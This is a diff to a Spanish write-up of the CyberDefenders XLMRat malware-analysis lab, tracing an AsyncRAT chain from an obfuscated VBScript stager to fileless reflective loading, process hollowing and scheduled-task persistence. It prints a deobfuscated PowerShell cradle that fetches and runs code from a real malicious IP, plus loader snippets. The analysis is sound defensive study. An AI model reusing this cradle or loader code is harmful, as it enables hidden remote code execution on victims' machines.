@@ -4,7 +4,7 @@
 
 El reto **XLMRat** de **CyberDefenders** presenta un caso de estudio avanzado sobre la cadena de infección de un **RAT (Remote Access Trojan)** que prioriza el sigilo mediante técnicas de evasión de defensas. El análisis no se limita a la identificación de indicadores básicos (IOCs), sino que exige una inmersión profunda en la **memoria del proceso** y el **tráfico de red** para comprender cómo el malware evade soluciones de seguridad convencionales.
 
-El incidente comienza con un _stager_ inicial que utiliza **ofuscación por fragmentación** en VBScript para descargar un segundo payload bajo una extensión falsa (`.jpg`). Este segundo componente orquesta una carga **fileless** (sin rastro en disco) mediante **Reflective Code Loading**, utilizando la API de reflexión de .NET para inyectar el ejecutable final en procesos legítimos de Windows.
+El incidente comienza con un _stager_ inicial que utiliza **ofuscación por fragmentación** en VBScript para descargar un segundo payload bajo una extensión falsa (`.jpg`). Este segundo componente orquesta una carga **fileless** (sin rastro en disco) mediante **Reflective Code Loading**, utilizando la API reflection de .NET para inyectar el ejecutable final en procesos legítimos de Windows.
 
 ~~~txt
 Platform: CyberDefenders
@@ -50,7 +50,7 @@ Cualquier comunicación que salga de un rango privado (`10.x.x.x`, `192.168.x.x`
 
 ---
 
-#### Archivos descargados
+#### Downloaded Files
 
 Mediante `Export Objects → HTTP` se observa que desde el hostname `45.126.209.4:222` únicamente fueron descargados dos archivos: `xlm.txt` y `mdm.jpg`. 
 
@@ -84,7 +84,7 @@ Al analizar la IP pública en [AbuseIPDB](https://www.abuseipdb.com/check/45.126
 
 > _"By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?"_
 
-#### Primera etapa: `xlm.txt` — VBScript ofuscado
+#### Loader: `xlm.txt` — VBScript obfuscated
 
 Al realizar `Follow --> HTTP Stream` sobre el tráfico de `xlm.txt`, se observa que, aunque el servidor lo entrega con `Content-Type: text/plain`, el contenido real es un script **VBScript** diseñado para evadir detecciones estáticas mediante una técnica de fragmentación de strings.
 
@@ -215,7 +215,7 @@ objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " &
 Set objShell = Nothing
 ~~~
 
-#### Técnicas de evasión identificadas
+#### Evasion techniques identified
 
 - **Ofuscación por fragmentación**: El script define un array `LZeWX(88)` donde cada índice contiene solo 2 o 3 caracteres. Esto impide que los motores antivirus (AV) encuentren firmas de comandos conocidos como `New-Object` o `DownloadString` en una sola línea.
 - **Vector de ejecución en cadena**: Utiliza `WScript.Shell` para invocar `Cmd.exe`, el cual a su vez invoca `PowerShell.exe`.
@@ -224,7 +224,7 @@ Set objShell = Nothing
     - `-WIND HIDDEN` — Oculta la ventana de consola.
     - `-eXeC BYPASS` — Omite la política de restricción de scripts de Windows.
 
-#### Comando resultante tras desofuscar el bucle `For`
+#### Deobfuscated command 
 
 ```powershell
 POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI [Byte[]];$A123='IEX(NeW-OBJeCT NeT.WebClient).DownloadString(''http://45.126.209.4:222/mdm.jpg'').REPLACE(''VAN'',''ADSTRING'')';IEX($A123)
@@ -234,7 +234,7 @@ POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI [Byte[]];$A123='IEX(NeW-OBJe
 
 ---
 
-#### Segunda etapa: `mdm.jpg` — PowerShell con carga fileless
+#### Payload: `mdm.jpg` — PowerShell 
 
 Al realizar `Follow --> HTTP Stream` sobre el tráfico que contiene `mdm.jpg` se confirma que el archivo **no es una imagen**: es un script de **PowerShell** que orquesta una carga completamente en memoria (_fileless_) de dos binarios embebidos.
 
@@ -346,11 +346,11 @@ $taskFolder = $scheduler.GetFolder("\")
 $taskFolder.RegisterTaskDefinition("Update Edge", $taskDefinition, 6, $null, $null, 3)
 ~~~
 
-#### Indicadores de ejecutables embebidos
+#### Embedded executable indicators
 
 Tanto la variable `$hexString_bbb` como `$hexString_pe` comienzan con los bytes `4D 5A`, que en ASCII es la secuencia **MZ**: la firma universal (_magic bytes_) de cualquier archivo ejecutable PE (Portable Executable) de Windows, ya sea `.exe` o `.dll`.
 
-#### Rol de cada payload
+#### $hexString_pe and $hexString_bbb
 
 |Variable|Tipo|Rol|
 |---|---|---|
@@ -359,7 +359,7 @@ Tanto la variable `$hexString_bbb` como `$hexString_pe` comienzan con los bytes 
 
 > **Nota:** `NewPE2.PE` es un loader de Process Hollowing públicamente conocido, con repositorios disponibles en GitHub. Su identificación puede utilizarse como punto de partida en búsquedas de inteligencia de amenazas (threat intel) y atribución.
 
-#### Técnica de carga en memoria (fileless)
+#### Reflecting Code Loading
 
 ```powershell
 [Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
@@ -372,7 +372,7 @@ $Fu = [Reflection.Assembly]::Load($pe)
 
 - **Nota**: Reflecting Code Loading es el término técnico exacto para cargar binarios en memoria evitando el escaneo de archivos en disco (On-access scanning).
 
-#### SHA256 del Malware Executable
+#### SHA256 Hash
 
 Es posible analizar el hash **SHA256** con el fin de obtener información detallada del malware ejecutable. En este caso se utiliza un script en PowerShell para convertir la linea `$hexString_bbb = "4D_5A_90_00_03_..."` de hexadecimal a binario: 
 
@@ -393,7 +393,7 @@ El script genera un ejecutable `payload.exe` el cuál es posible obtener su hash
 
 > What is the malware family label based on Alibaba?
 
-Se analiza el hash en [VirusTotal](https://www.virustotal.com/gui) y se detalla que la familia del malware según Alibaba es **AsynRat**, un tipo de malware catalogado como **RAT (Remote Access Troyan)**. Están diseñados para permitir el control total de una computadora de forma remota, generalmente sin que la victima se dé cuenta. 
+Se analiza el hash en [VirusTotal](https://www.virustotal.com/gui) y se detalla que la familia del malware según Alibaba es **AsyncRat**, un tipo de malware catalogado como **RAT (Remote Access Trojan)**. Están diseñados para permitir el control total de una computadora de forma remota, generalmente sin que la victima se dé cuenta. 
 
 ![[XLMRat-6.png]]
 
@@ -420,6 +420,8 @@ $AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe'-repla
 $VA = @($AC, $NKbb)
 ~~~
 
+#### Process Hollowing
+
 El loader (`$hexString_pe`) realiza **Process Hollowing**. Toma como objetivo el **LOLBin** `RegSvcs.exe`, una herramienta legítima del framework .NET de Microsoft:
 
 1. Inicia `RegSvcs.exe` en **estado suspendido**.
@@ -437,9 +439,10 @@ Para el Administrador de Tareas y para herramientas de monitoreo superficial, el
 
  > The script is designed to drop several files. List the names of the files dropped by the script.
 
-Aunque la ejecución inicial es fileless, el script establece un mecanismo de **persistencia que sí toca el disco**. Los dos conceptos no se contradicen: el binario malicioso nunca se escribe como `.exe` en el sistema, pero los lanzadores que garantizan su re-ejecución sí se almacenan.
+Aunque la ejecución inicial es fileless, el script establece un mecanismo de **persistencia que sí toca el disco**.
+#### Persistence
 
-Se generan tres archivos en `C:\Users\Public\`:
+El binario malicioso nunca se escribe como `.exe` en el sistema, pero los lanzadores que garantizan su re-ejecución sí se almacenan. Se generan tres archivos en `C:\Users\Public\`:
 
 |Archivo|Tipo|Función|
 |---|---|---|
